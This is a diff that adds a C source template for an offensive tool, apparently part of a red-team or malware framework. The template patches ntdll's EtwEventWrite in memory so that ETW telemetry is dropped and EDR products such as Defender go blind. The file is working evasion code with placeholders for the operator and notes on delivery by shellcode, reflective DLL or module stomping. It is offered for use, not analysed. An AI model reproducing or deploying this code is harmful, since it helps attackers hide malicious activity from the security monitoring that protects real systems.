@@ -1,0 +1,39 @@
+/* etw_patch.c.j2 — reference template for `etw-patch-memory`
+ *
+ * Overwrite ntdll!EtwEventWrite with `xor eax, eax ; ret` so every
+ * ETW event the process emits silently drops. EDR products relying on
+ * ETW (Defender, Elastic Endpoint, SentinelOne detection paths) go
+ * blind for in-process behavior.
+ *
+ * Operator substitutes:
+ *   {{patch_bytes}}   — architecture-correct patch
+ *   {{etw_function}}  — target (default: "EtwEventWrite"; variants:
+ *                       "EtwEventWriteFull", "EtwEventWriteEx")
+ *
+ * Delivery: shellcode-stub, reflective_dll, or module-stomping. Should
+ * run EARLY in the host process lifetime — before the first ETW event
+ * that might otherwise leak. */
+
+#include <windows.h>
+
+/* x64: xor eax, eax (31 C0); ret (C3) — 3 bytes */
+static const unsigned char PATCH_X64[] = {{patch_bytes}};
+
+__declspec(dllexport) BOOL etw_bypass(void) {
+    HMODULE h = GetModuleHandleA("ntdll.dll");
+    if (!h) return FALSE;
+
+    void *target = (void *) GetProcAddress(h, "{{etw_function}}");
+    if (!target) return FALSE;
+
+    DWORD old;
+    if (!VirtualProtect(target, sizeof(PATCH_X64), PAGE_EXECUTE_READWRITE, &old))
+        return FALSE;
+
+    memcpy(target, PATCH_X64, sizeof(PATCH_X64));
+
+    DWORD discard;
+    VirtualProtect(target, sizeof(PATCH_X64), old, &discard);
+    FlushInstructionCache(GetCurrentProcess(), target, sizeof(PATCH_X64));
+    return TRUE;
+}
